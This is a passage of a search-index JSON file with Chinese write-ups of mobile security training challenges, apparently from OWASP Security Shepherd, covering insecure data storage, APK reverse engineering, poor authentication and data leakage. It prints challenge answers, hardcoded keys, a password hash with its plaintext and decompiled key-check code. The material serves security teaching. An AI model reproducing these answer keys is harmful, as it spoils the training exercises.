1)"},{"location":"vul/app/Mobile-Insecure-Data-Storage-1.html#_1","text":"base64\u7f16\u7801\u7684\u7ba1\u7406\u5458\u5bc6\u7801\u4fdd\u5b58\u5728\u4e86\u6570\u636e\u5e93\u4e2d","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/app/Mobile-Insecure-Data-Storage-1.html#_2","text":"public void insertData(){ Users.execSQL(\"DELETE FROM Users;\"); Users.execSQL(\"INSERT INTO Users (name, password) VALUES ('Tyrkyr','ZG9jaGRvY2hkb2No');\"); Users.execSQL(\"INSERT INTO Users (name, password) VALUES ('ToothBrush','MmNvb2w0dWxvbD8=');\"); Users.execSQL(\"INSERT INTO Users (name, password) VALUES ('TroolMann','QnJpZGdlcw==');\"); Users.execSQL(\"INSERT INTO Users (name, password) VALUES ('Patrick','ZGlub3NhdXI=');\"); Users.execSQL(\"INSERT INTO Users (name, password) VALUES ('bottles','cGFzc3dvcmQxMjM0');\"); Users.execSQL(\"INSERT INTO Users (name, password) VALUES ('Root','V2Fyc2hpcHNBbmRXcmVuY2hlcw==');\"); }","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/app/Mobile-Insecure-Data-Storage-1.html#_3","text":"\u8bfb\u53d6\u6570\u636e,base64\u89e3\u7801","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/app/Mobile-Insecure-Data-Storage-1.html#_4","text":"base64\u662f\u4e0d\u5b89\u5168\u7684","title":"\u603b\u7ed3"},{"location":"vul/app/Mobile-Insecure-Data-Storage-2.html","text":"Mobile Insecure Data Storage 2(\u4e0d\u5b89\u5168\u7684\u6570\u636e\u5b58\u50a8 2) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u5c06\u5bc6\u7801hash\u5b58\u50a8\u5728databases\u4e2d \u529f\u80fd\u5b9e\u73b0 \u00b6 \u89e3\u9898\u6b65\u9aa4 \u00b6 \u4fdd\u5b58\u5728 /data/data/com.mobshep.insecuredata2/databases/passwordDB hash 0e3a0c8c3a571a855c958813d9b851a1 \u5bf9\u5e94\u660e\u6587 starfish123 \u603b\u7ed3 \u00b6","title":"Mobile Insecure Data Storage 2(\u4e0d\u5b89\u5168\u7684\u6570\u636e\u5b58\u50a8 2)"},{"location":"vul/app/Mobile-Insecure-Data-Storage-2.html#mobile-insecure-data-storage-2-2","text":"","title":"Mobile Insecure Data Storage 2(\u4e0d\u5b89\u5168\u7684\u6570\u636e\u5b58\u50a8 2)"},{"location":"vul/app/Mobile-Insecure-Data-Storage-2.html#_1","text":"\u5c06\u5bc6\u7801hash\u5b58\u50a8\u5728databases\u4e2d","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/app/Mobile-Insecure-Data-Storage-2.html#_2","text":"","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/app/Mobile-Insecure-Data-Storage-2.html#_3","text":"\u4fdd\u5b58\u5728 /data/data/com.mobshep.insecuredata2/databases/passwordDB hash 0e3a0c8c3a571a855c958813d9b851a1 \u5bf9\u5e94\u660e\u6587 starfish123","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/app/Mobile-Insecure-Data-Storage-2.html#_4","text":"","title":"\u603b\u7ed3"},{"location":"vul/app/Mobile-Reverse-Engineer-2.html","text":"Mobile Reverse Engineer 2(\u9006\u5411\u5de5\u7a0b 2) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u901a\u8fc7\u9006\u5411ReverseEngineer2.apk \u627e\u5230\u5bc6\u94a5 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u89e3\u9898\u6b65\u9aa4 \u00b6 \u5177\u4f53\u9006\u5411\u65b9\u6cd5\u4e0e \u9006\u54111 \u76f8\u540c \u6253\u5f00Triangle.class \u53ef\u4ee5\u770b\u5230 \u5bc6\u94a5 \u603b\u7ed3 \u00b6 \u786c\u7f16\u7801\u662f\u975e\u5e38\u5371\u9669\u7684\u5bf9\u4e8e\u5ba2\u6237\u7aef\u7a0b\u5e8f","title":"Mobile Reverse Engineer 2(\u9006\u5411\u5de5\u7a0b 2)"},{"location":"vul/app/Mobile-Reverse-Engineer-2.html#mobile-reverse-engineer-2-2","text":"","title":"Mobile Reverse Engineer 2(\u9006\u5411\u5de5\u7a0b 2)"},{"location":"vul/app/Mobile-Reverse-Engineer-2.html#_1","text":"\u901a\u8fc7\u9006\u5411ReverseEngineer2.apk \u627e\u5230\u5bc6\u94a5","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/app/Mobile-Reverse-Engineer-2.html#_2","text":"","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/app/Mobile-Reverse-Engineer-2.html#_3","text":"\u5177\u4f53\u9006\u5411\u65b9\u6cd5\u4e0e \u9006\u54111 \u76f8\u540c \u6253\u5f00Triangle.class \u53ef\u4ee5\u770b\u5230 \u5bc6\u94a5","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/app/Mobile-Reverse-Engineer-2.html#_4","text":"\u786c\u7f16\u7801\u662f\u975e\u5e38\u5371\u9669\u7684\u5bf9\u4e8e\u5ba2\u6237\u7aef\u7a0b\u5e8f","title":"\u603b\u7ed3"},{"location":"vul/app/Mobile-Reverse-Engineer-3.html","text":"Mobile Reverse Engineer 3(\u9006\u5411\u5de5\u7a0b 3) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u901a\u8fc7\u9006\u5411\u83b7\u5f97\u5bc6\u94a5 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u5177\u4f53\u9006\u5411\u65b9\u6cd5\u4e0e \u9006\u54111 \u76f8\u540c \u6253\u5f00Reverse_Engineering4.class \u5373\u53ef\u770b\u5230 \u5177\u4f53\u7b97\u6cd5 paramView = new StringBuilder(\"Z\"); paramView.append(\"Y\"); paramView.append(\"4399e0f52227dbab4d74bbd3dd2e3c4c\".substring(0, \"4399e0f52227dbab4d74bbd3dd2e3c4c\".length() / 2)); paramView.append(\"1\"); paramView.append(\"C\"); paramView.reverse(); paramView.append(\"8\"); if (this.etKeyCheck.getText().toString().contentEquals(paramView)) { Toast.makeText(this, \"Valid Key\", 1).show(); return; } \u89e3\u9898\u6b65\u9aa4 \u00b6 \u5982\u4e0a \u603b\u7ed3 \u00b6","title":"Mobile Reverse Engineer 3(\u9006\u5411\u5de5\u7a0b 3)"},{"location":"vul/app/Mobile-Reverse-Engineer-3.html#mobile-reverse-engineer-3-3","text":"","title":"Mobile Reverse Engineer 3(\u9006\u5411\u5de5\u7a0b 3)"},{"location":"vul/app/Mobile-Reverse-Engineer-3.html#_1","text":"\u901a\u8fc7\u9006\u5411\u83b7\u5f97\u5bc6\u94a5","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/app/Mobile-Reverse-Engineer-3.html#_2","text":"\u5177\u4f53\u9006\u5411\u65b9\u6cd5\u4e0e \u9006\u54111 \u76f8\u540c \u6253\u5f00Reverse_Engineering4.class \u5373\u53ef\u770b\u5230 \u5177\u4f53\u7b97\u6cd5 paramView = new StringBuilder(\"Z\"); paramView.append(\"Y\"); paramView.append(\"4399e0f52227dbab4d74bbd3dd2e3c4c\".substring(0, \"4399e0f52227dbab4d74bbd3dd2e3c4c\".length() / 2)); paramView.append(\"1\"); paramView.append(\"C\"); paramView.reverse(); paramView.append(\"8\"); if (this.etKeyCheck.getText().toString().contentEquals(paramView)) { Toast.makeText(this, \"Valid Key\", 1).show(); return; }","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/app/Mobile-Reverse-Engineer-3.html#_3","text":"\u5982\u4e0a","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/app/Mobile-Reverse-Engineer-3.html#_4","text":"","title":"\u603b\u7ed3"},{"location":"vul/app/Mobile-Reverse-Engineering.html","text":"Mobile Reverse Engineering(\u79fb\u52a8\u9006\u5411\u5de5\u7a0b) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u9700\u8981\u5bf9 ReverseEngineer.apk \u8fdb\u884c\u9006\u5411\uff0c\u8fd9\u662f\u4e00\u4e2a\u6ca1\u6709\u4efb\u4f55\u6df7\u6dc6\u7684apk \u529f\u80fd\u5b9e\u73b0 \u00b6 \u4f7f\u7528 dex2jar \u548c jd-gui \u5b8c\u6210\u9006\u5411 \u5373\u53ef \u89e3\u9898\u6b65\u9aa4 \u00b6 \u5c06 ReverseEngineer.apk \u91cd\u547d\u540d\u4e3a ReverseEngineer.zip \u89e3\u538b\u7f29 ReverseEngineer.zip \u627e\u5230 classes.dex \u5c06 classes.dex \u653e\u5165 dex2jar-2.0 \u76ee\u5f55 \u6267\u884c d2j-dex2jar.bat classes.dex \u8f93\u51fa classes-dex2jar.jar \u4f7f\u7528jd-gui-1.4.0.jar \u6253\u5f00 classes-dex2jar.jar \u5728 com\\mobshep\\reverseengineer\\Reverse_Engineering.class \u770b\u5230\u654f\u611f\u4fe1\u606f public class Reverse_Engineering extends Activity { String secret = \"The Key is DrumaDrumaDrumBoomBoom\"; //\u654f\u611f\u4fe1\u606f protected void onCreate(Bundle paramBundle) { super.onCreate(paramBundle); setContentView(2130903063); } } \u603b\u7ed3 \u00b6 \u4f7f\u7528Android SDK\u81ea\u5e26\u7684 ProGuard\uff0c\u5bf9apk\u8fdb\u884c\u6df7\u6dc6 \u5982\u679capk\u975e\u5e38\u975e\u5e38\u91cd\u8981\uff0c\u53ef\u4ee5\u4f7f\u7528\u7b2c\u4e09\u65b9\u5de5\u5177\u8fdb\u884c\u6df7\u6dc6","title":"Mobile Reverse Engineering(\u79fb\u52a8\u9006\u5411\u5de5\u7a0b)"},{"location":"vul/app/Mobile-Reverse-Engineering.html#mobile-reverse-engineering","text":"","title":"Mobile Reverse Engineering(\u79fb\u52a8\u9006\u5411\u5de5\u7a0b)"},{"location":"vul/app/Mobile-Reverse-Engineering.html#_1","text":"\u9700\u8981\u5bf9 ReverseEngineer.apk \u8fdb\u884c\u9006\u5411\uff0c\u8fd9\u662f\u4e00\u4e2a\u6ca1\u6709\u4efb\u4f55\u6df7\u6dc6\u7684apk","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/app/Mobile-Reverse-Engineering.html#_2","text":"\u4f7f\u7528 dex2jar \u548c jd-gui \u5b8c\u6210\u9006\u5411 \u5373\u53ef","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/app/Mobile-Reverse-Engineering.html#_3","text":"\u5c06 ReverseEngineer.apk \u91cd\u547d\u540d\u4e3a ReverseEngineer.zip \u89e3\u538b\u7f29 ReverseEngineer.zip \u627e\u5230 classes.dex \u5c06 classes.dex \u653e\u5165 dex2jar-2.0 \u76ee\u5f55 \u6267\u884c d2j-dex2jar.bat classes.dex \u8f93\u51fa classes-dex2jar.jar \u4f7f\u7528jd-gui-1.4.0.jar \u6253\u5f00 classes-dex2jar.jar \u5728 com\\mobshep\\reverseengineer\\Reverse_Engineering.class \u770b\u5230\u654f\u611f\u4fe1\u606f public class Reverse_Engineering extends Activity { String secret = \"The Key is DrumaDrumaDrumBoomBoom\"; //\u654f\u611f\u4fe1\u606f protected void onCreate(Bundle paramBundle) { super.onCreate(paramBundle); setContentView(2130903063); } }","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/app/Mobile-Reverse-Engineering.html#_4","text":"\u4f7f\u7528Android SDK\u81ea\u5e26\u7684 ProGuard\uff0c\u5bf9apk\u8fdb\u884c\u6df7\u6dc6 \u5982\u679capk\u975e\u5e38\u975e\u5e38\u91cd\u8981\uff0c\u53ef\u4ee5\u4f7f\u7528\u7b2c\u4e09\u65b9\u5de5\u5177\u8fdb\u884c\u6df7\u6dc6","title":"\u603b\u7ed3"},{"location":"vul/app/Poor-Authentication.html","text":"Poor Authentication(\u5931\u6548\u7684\u8eab\u4efd\u8ba4\u8bc1) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u5931\u6548\u7684\u8eab\u4efd\u8ba4\u8bc1\u95ee\u9898\u662f\u53d1\u751f\u5728\u5f53\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u4f9d\u8d56\u4e8e\u4e00\u4e2a\u4e0d\u5b89\u5168\u7684\u8ba4\u8bc1\u65b9\u5f0f.\u8fd9\u53ef\u4ee5\u6709\u8bb8\u591a\u4e0d\u540c\u7684\u5f62\u5f0f.\u5176\u4e2d\u4e00\u4e2a\u4f8b\u5b50\u5c31\u662f\u5bc6\u7801\u91cd\u7f6e\u529f\u80fd,\u867d\u7136\u65b9\u4fbf,\u5374\u53ef\u4ee5\u6cc4\u6f0f\u8ba4\u8bc1\u7684\u8fc7\u7a0b.\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d,\u6211\u4eec\u4e0d\u9700\u8981\u77e5\u9053\u5bc6\u7801\u4f5c\u4e3a\u91cd\u7f6e\u8fd9\u4e2a\u529f\u80fd\u4e8e\u6211\u4eec\u662f\u53ef\u7528\u7684.\u5176\u6b21,\u8fd9\u4e2a\u7a0b\u5e8f\u6b63\u5728\u6cc4\u6f0f\u7528\u6237\u5728\u5148\u524d\u4f7f\u7528\u7a0b\u5e8f\u4e2d\u5df2\u7ecf\u952e\u5165\u7684\u4fe1\u606f\u7684\u65e5\u5fd7.\u8fd9\u4e9b\u4fe1\u606f\u5c06\u63d0\u4f9b\u7ed9\u4f60\u6240\u9700\u8981\u91cd\u7f6e\u5bc6\u7801\u548c\u83b7\u5f97\u94a5\u5319\u7684\u6570\u636e.\u8eab\u4efd\u8ba4\u8bc1\u662f\u9a8c\u8bc1\u4e00\u4e2a\u7528\u6237\u8bf4\u4ed6\u662f\u8c01.\u6388\u6743\u662f\u9a8c\u8bc1\u7528\u6237\u5177\u6709\u8bbf\u95ee\u7ed9\u5b9a\u7684\u8d44\u6e90\u7684\u6743\u5229 (\u4f8b\u5982\u7ba1\u7406\u5458\u7279\u6743). \u529f\u80fd\u5b9e\u73b0 \u00b6 \u89e3\u9898\u6b65\u9aa4 \u00b6 \u91cd\u7f6e\u5bc6\u7801\u529f\u80fd\uff0c\u53ef\u4ee5\u4ece\u65e5\u5fd7\u6587\u4ef6 /data/data/com.mobshep.poorauthentication/files \u627e\u5230\u7b54\u6848 Chicken \u548c Meade \u540c\u65f6\u65e5\u5fd7\u4e2d\u80fd\u591f\u770b\u5230 \u7528\u6237\u540d\u662f Jack \u603b\u7ed3 \u00b6","title":"Poor Authentication(\u5931\u6548\u7684\u8eab\u4efd\u8ba4\u8bc1)"},{"location":"vul/app/Poor-Authentication.html#poor-authentication","text":"","title":"Poor Authentication(\u5931\u6548\u7684\u8eab\u4efd\u8ba4\u8bc1)"},{"location":"vul/app/Poor-Authentication.html#_1","text":"\u5931\u6548\u7684\u8eab\u4efd\u8ba4\u8bc1\u95ee\u9898\u662f\u53d1\u751f\u5728\u5f53\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u4f9d\u8d56\u4e8e\u4e00\u4e2a\u4e0d\u5b89\u5168\u7684\u8ba4\u8bc1\u65b9\u5f0f.\u8fd9\u53ef\u4ee5\u6709\u8bb8\u591a\u4e0d\u540c\u7684\u5f62\u5f0f.\u5176\u4e2d\u4e00\u4e2a\u4f8b\u5b50\u5c31\u662f\u5bc6\u7801\u91cd\u7f6e\u529f\u80fd,\u867d\u7136\u65b9\u4fbf,\u5374\u53ef\u4ee5\u6cc4\u6f0f\u8ba4\u8bc1\u7684\u8fc7\u7a0b.\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d,\u6211\u4eec\u4e0d\u9700\u8981\u77e5\u9053\u5bc6\u7801\u4f5c\u4e3a\u91cd\u7f6e\u8fd9\u4e2a\u529f\u80fd\u4e8e\u6211\u4eec\u662f\u53ef\u7528\u7684.\u5176\u6b21,\u8fd9\u4e2a\u7a0b\u5e8f\u6b63\u5728\u6cc4\u6f0f\u7528\u6237\u5728\u5148\u524d\u4f7f\u7528\u7a0b\u5e8f\u4e2d\u5df2\u7ecf\u952e\u5165\u7684\u4fe1\u606f\u7684\u65e5\u5fd7.\u8fd9\u4e9b\u4fe1\u606f\u5c06\u63d0\u4f9b\u7ed9\u4f60\u6240\u9700\u8981\u91cd\u7f6e\u5bc6\u7801\u548c\u83b7\u5f97\u94a5\u5319\u7684\u6570\u636e.\u8eab\u4efd\u8ba4\u8bc1\u662f\u9a8c\u8bc1\u4e00\u4e2a\u7528\u6237\u8bf4\u4ed6\u662f\u8c01.\u6388\u6743\u662f\u9a8c\u8bc1\u7528\u6237\u5177\u6709\u8bbf\u95ee\u7ed9\u5b9a\u7684\u8d44\u6e90\u7684\u6743\u5229 (\u4f8b\u5982\u7ba1\u7406\u5458\u7279\u6743).","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/app/Poor-Authentication.html#_2","text":"","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/app/Poor-Authentication.html#_3","text":"\u91cd\u7f6e\u5bc6\u7801\u529f\u80fd\uff0c\u53ef\u4ee5\u4ece\u65e5\u5fd7\u6587\u4ef6 /data/data/com.mobshep.poorauthentication/files \u627e\u5230\u7b54\u6848 Chicken \u548c Meade \u540c\u65f6\u65e5\u5fd7\u4e2d\u80fd\u591f\u770b\u5230 \u7528\u6237\u540d\u662f Jack","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/app/Poor-Authentication.html#_4","text":"","title":"\u603b\u7ed3"},{"location":"vul/app/Reverse-Engineering-1.html","text":"Reverse Engineering 1(\u9006\u5411\u5de5\u7a0b 1) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u9006\u5411ReverseEngineer1.apk \uff0c\u627e\u5230App author's name \u529f\u80fd\u5b9e\u73b0 \u00b6 \u89e3\u9898\u6b65\u9aa4 \u00b6 jarsigner -verify -verbose -certs ReverseEngineer1.apk \u539f\u6765\u662f\u7528\u8fd9\u4e2a\u547d\u4ee4\uff0c\u83b7\u5f97\u7b7e\u540d\u4fe1\u606f \u603b\u7ed3 \u00b6","title":"Reverse Engineering 1(\u9006\u5411\u5de5\u7a0b 1)"},{"location":"vul/app/Reverse-Engineering-1.html#reverse-engineering-1-1","text":"","title":"Reverse Engineering 1(\u9006\u5411\u5de5\u7a0b 1)"},{"location":"vul/app/Reverse-Engineering-1.html#_1","text":"\u9006\u5411ReverseEngineer1.apk \uff0c\u627e\u5230App author's name","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/app/Reverse-Engineering-1.html#_2","text":"","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/app/Reverse-Engineering-1.html#_3","text":"jarsigner -verify -verbose -certs ReverseEngineer1.apk \u539f\u6765\u662f\u7528\u8fd9\u4e2a\u547d\u4ee4\uff0c\u83b7\u5f97\u7b7e\u540d\u4fe1\u606f","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/app/Reverse-Engineering-1.html#_4","text":"","title":"\u603b\u7ed3"},{"location":"vul/app/Unintended-Data-Leakage.html","text":"Unintended Data Leakage(\u79fb\u52a8\u6570\u636e\u610f\u5916\u6cc4\u6f0f) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u627e\u5230\u5e94\u7528\u5199\u5230files\u76ee\u5f55\u4e0b\u7684\u654f\u611f\u4fe1\u606f \u529f\u80fd\u5b9e\u73b0 \u00b6 \u6587\u4ef6\u5728\u865a\u62df\u673a\u7684/data/data/com.mobshep.udataleakage/files/Tue Jul 08 172618 EDT 2014 \u89e3\u9898\u6b65\u9aa4 \u00b6 \u5982\u4e0a \u603b\u7ed3 \u00b6 \u4e0d\u8981\u5c06\u654f\u611f\u4fe1\u606f\u4fdd\u5b58\u5728app\u7aef","title":"Unintended Data Leakage(\u79fb\u52a8\u6570\u636e\u610f\u5916\u6cc4\u6f0f)"},{"location":"vul/app/Unintended-Data-Leakage.html#unintended-data-leakage","text":"","title":"Unintended Data Leakage(\u79fb\u52a8\u6570\u636e\u610f\u5916\u6cc4\u6f0f)"},{"location":"vul/app/Unintended-Data-Leakage.html#_1","text":"\u627e\u5230\u5e94\u7528\u5199\u5230files\u76ee\u5f55\u4e0b\u7684\u654f\u611f\u4fe1\u606f","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/app/Unintended-Data-Leakage.html#_2","text":"\u6587\u4ef6\u5728\u865a\u62df\u673a\u7684/data/data/com.mobshep.udataleakage/files/Tue Jul 08 172618 EDT 2014","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/app/Unintended-Data-Leakage.html#_3","text":"\u5982\u4e0a","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/app/Unintended-Data-Leakage.html#_4","text":"\u4e0d\u8981\u5c06\u654f\u611f\u4fe1\u606f\u4fdd\u5b58\u5728app\u7aef","title":"\u603b\u7ed3"},{"location":"vul/app/vul.html","text":"\u00b6 \u9898\u4ecb\u7ecd \u00b6 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u89e3\u9898\u6b65\u9aa4 \u00b6 \u603b\u7ed3 \u00b6","title":"Vul"},{"location":"vul/app/vul.html#_1","text":"","title":""},{"location":"vul/app/vul.html#_2","text":"","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/app/vul.html#_3","text":"","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/app/vul.html#_4","text":"","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/app/vul.html#_5","text":"","title":"\u603b\u7ed3"}]}